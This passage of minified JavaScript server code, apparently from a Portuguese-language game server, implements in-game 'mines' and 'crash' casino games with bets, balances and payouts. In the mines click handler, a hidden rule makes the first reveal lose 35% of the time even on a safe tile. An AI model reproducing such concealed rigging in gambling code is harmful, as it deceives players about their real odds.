    }
    if (rY.rolling) {
        let o = {
            error: "Aguarde a roleta finalizar o jogo atual"
        };
        return o
    }
    if (rY.getBets(i) + a > rM) return {
        error: "O limite de apostas \xe9 " + pu(rM)
    };
    let l = await rR(i);
    if (l < a) {
        let p = {
            error: "Saldo insuficiente"
        };
        return p
    }
    if (a > rM) {
        let d = {};
        return d.error = "O limite de apostas \xe9 " + rM, d
    }
    return rY.addBet(i, r, a), await rS(i, l - a), rY.delay
};
const rZ = {};
rZ.multipliers = [0, .05, .06, .07, .08, .1, .15, .2, .25, .35, .45, .55, .65, .75, .9, 1.1, 1.3, 1.6, 2, 2.4, 2.6, 3.5, 5, 8, 20];
const s0 = rZ;

function s1(t) {
    let r = Array(25).fill(1);
    for (; t > 0;) {
        let a = Math.floor(Math.random() * r.length);
        r[a] && (r[a] = 0, t -= 1)
    }
    return r
}
global.on("playerDropped", () => delete s0[source]), rP.casino_mine_start = async (t, r, a) => {
    let i = await pp.getUserId(t);
    if (Number.isSafeInteger(i)) {
        if (i in s0) {
            let n = {
                error: "Voc\xea j\xe1 est\xe1 em um jogo"
            };
            return n
        }
        if ((r = parseInt(r)) && !(r <= 0)) {
            if ((a = parseInt(a)) && !(a < 1) && !(a > 24)) {
                if (r > rM) return {
                    error: "O limite por aposta \xe9 " + pu(rM)
                }
            } else {
                let s = {
                    error: "Quantidade de minas inv\xe1lida"
                };
                return s
            }
        } else {
            let o = {
                error: "Valor da aposta inv\xe1lido"
            };
            return o
        }
    } else {
        let l = {
            error: "Voc\xea est\xe1 bugado"
        };
        return l
    }
    let p = await rR(i);
    if (p < r) {
        let d = {
            error: "Saldo insuficiente"
        };
        return d
    }
    await rS(i, p - r);
    let u = {
        id: require("crypto").randomUUID(),
        revealed: {},
        lost: !1,
        multiplier: s0.multipliers[a],
        bet: r,
        reward: 0,
        grid: s1(a)
    };
    s0[t] = u;
    let c = {};
    c.user_id = i, await rL().where(c).update().decrement("mine", r);
    let h = {
        ...u
    };
    return h.grid = void 0, h
}, rP.casino_mine_finish = async t => {
    let r = await pp.getUserId(t);
    if (Number.isSafeInteger(r)) {
        if (!s0.hasOwnProperty(t)) {
            let a = {
                error: "Voc\xea n\xe3o est\xe1 em um jogo"
            };
            return a
        }
    } else {
        let i = {
            error: "Voc\xea est\xe1 bugado"
        };
        return i
    }
    let n = s0[t];
    if (0 == n.reward) {
        let s = {
            error: "Voc\xea n\xe3o pode encerrar o jogo agora"
        };
        return s
    }
    let o = Math.ceil(n.bet + n.reward);
    await rT(r, o);
    let l = {};
    l.user_id = r, await rL().where(l).update().increment("mine", o), delete s0[t];
    let p = {};
    return p.reward = o, p
}, rP.casino_mine_click = async (t, r) => {
    let a = await pp.getUserId(t);
    if (Number.isSafeInteger(a)) {
        if (s0.hasOwnProperty(t)) {
            if (!Number.isSafeInteger(r) || r < 0 || r > 24) {
                let i = {
                    error: "ERR_INVALID_INDEX"
                };
                return i
            }
        } else {
            let n = {
                error: "Voc\xea n\xe3o est\xe1 em um jogo"
            };
            return n
        }
    } else {
        let s = {
            error: "Voc\xea est\xe1 bugado"
        };
        return s
    }
    let o = s0[t];
    if (o.revealed[r]) {
        let l = {
            error: "Voc\xea j\xe1 revelou esta mina"
        };
        return l
    }
    let p = .35 >= Math.random() && 0 == o.reward;
    return !o.grid[r] || p ? (delete s0[t], ["mine", Math.ceil(o.bet + o.reward)]) : (o.revealed[r] = !0, o.reward += o.bet * o.multiplier, ["diamond", Math.ceil(o.bet + o.reward)])
};
const s2 = t => require("crypto").createHash("sha256").update(t).digest("hex");

function s3(t, r) {
    let a = 0,
        i = t.length % 4;
    for (let n = i > 0 ? i - 4 : 0; n < t.length; n += 4) a = ((a << 16) + parseInt(t.substring(n, n + 4), 16)) % r;
    return 0 === a
}

function s4() {
    return s2(process.hrtime()[1] + pB.token)
}

function s5(t) {
    if (s3(t, p4(pB, "exclusive", "casino", "instaCrash") || 5)) return 1;
    let r = parseInt(t.slice(0, 13), 16),
        a = 4503599627370496,
        i = Math.floor((100 * a - r) / (a - r)) / 100;
    for (; i >= (p4(pB, "exclusive", "casino", "maxCrash") || 50);) i /= 1.125;
    return parseFloat(i.toFixed(2))
}
class s6 {
    constructor() {
        this.refresh()
    }
    addBet(t, r, a, i) {
        this.bets.length || (this.startAt = Date.now() + 15e3, setTimeout(() => {
            this.crash()
        }, 15500), rV("CASINO_CRASH_WARMUP"));
        let n = {};
        n.source = t, n.user_id = r, n.amount = a, n.cashout = i, this.bets.push(n)
    }
    getBets(t) {
        return this.bets.reduce((r, a) => r + (a.user_id == t ? a.amount : 0), 0)
    }
    get delay() {
        return "ending" === this.status ? this.endAt - Date.now() : this.bets.length ? this.startAt - Date.now() : 0
    }
    crash() {
        let t = s5(s4());
        rV("CASINO_CRASH", t <= 1), this.multiplier = 1, this.status = "crashing";
        let r = Date.now(),
            a = setInterval(() => {
                if (this.multiplier >= t) return this.status = "ending", this.endAt = Date.now() + 5e3, rV("CASINO_CRASH_ENDING", t), setTimeout(() => this.refresh(), 5e3), s6.last.push(t), s6.last.shift(), clearInterval(a);
                let i = Date.now(),
                    n = i - r;
                for (let s of (this.multiplier = Math.min(this.multiplier + Math.floor(this.multiplier) * (n / 100 * .01), t), r = i, this.bets))
                    if (s.cashout && this.multiplier >= s.cashout && !s.locked) {
                        s.locked = !0;
                        let o = Math.ceil(s.amount * s.cashout);
                        rT(s.user_id, o);
                        let l = {};
                        l.user_id = s.user_id, rL().where(l).update().increment("crash", o).then(), oS(s.source, "CASINO_INCREMENT", o), oS(s.source, "CASINO_CRASH_CASHOUT", [this.multiplier, o])
                    }
            }, 80)
    }
    refresh() {
        this.status = "waiting", this.bets = [], delete this.startAt, delete this.endAt, rV("CASINO_CRASH_REFRESH")
    }
}
s6.last = Array(10).fill("").map(() => s5(s4()));
const s7 = new s6;
rP.casino_crash = t => ({
    status: s7.status,
    multiplier: s7.multiplier,
    delay: s7.delay,
    last: s6.last,
    totalBet: s7.bets.reduce((r, a) => r + (a.source == t ? a.amount : 0), 0)
}), rP.casino_crash_bet = async (t, r, a) => {
    let i = await pp.getUserId(t),
        n = {
            error: "Voc\xea est\xe1 bugado"
        };
    if (!Number.isSafeInteger(i)) return n;
    if (!(r = parseInt(r)) || r <= 0) {
        let s = {
            error: "Valor inv\xe1lido"
        };
        return s
    }
    if ("crashing" === s7.status) {
        let o = {
            error: "Aguarde o jogo atual finalizar"
        };
        return o
    }
    if (s7.getBets(i) + r > rM) return {
        error: "O limite de apostas \xe9 " + pu(rM)
    };
    let l = await rR(i);
    if (l < r) {
        let p = {
            error: "Saldo insuficiente"
        };
        return p
    }
    if (a && "number" != typeof a) {
        let d = {
            error: "Valor de auto retirada inv\xe1lido"
        };
        return d
    }
    s7.addBet(t, i, r, a), await rS(i, l - r);
    let u = {};
    u.user_id = i, await rL().where(u).update().decrement("crash", r);
    let c = {};
    return c.delay = s7.delay, c
}, rP.casino_crash_cashout = async t => {
    let r = await pp.getUserId(t),
        a = {
            error: "Voc\xea est\xe1 bugado"
        };
    if (!Number.isSafeInteger(r)) return a;
    let i = s7.bets.filter(t => t.user_id == r),
        n = i.filter(t => !t.locked);
    if (i.length) {
        if (n.length) {
            if ("crashing" !== s7.status) {
                let s = {
                    error: "O jogo ainda n\xe3o come\xe7ou"
                };
                return s
            }
        } else {
            let o = {
                error: "Seu pr\xeamio j\xe1 foi resgatado"
            };
            return o
        }
    } else {
        let l = {
            error: "Voc\xea n\xe3o fez nenhuma aposta"
        };
        return l
    }
    let p = s7.multiplier,
        d = 0;
    for (let u of n) u.locked = !0, d += Math.ceil(u.amount * p);
    await rT(r, d);
    let c = {};
    return c.user_id = r, await rL().where(c).update().increment("crash", d), [p, d]
};
const s8 = {
    __proto__: null
};
var s9 = Object.freeze(s8);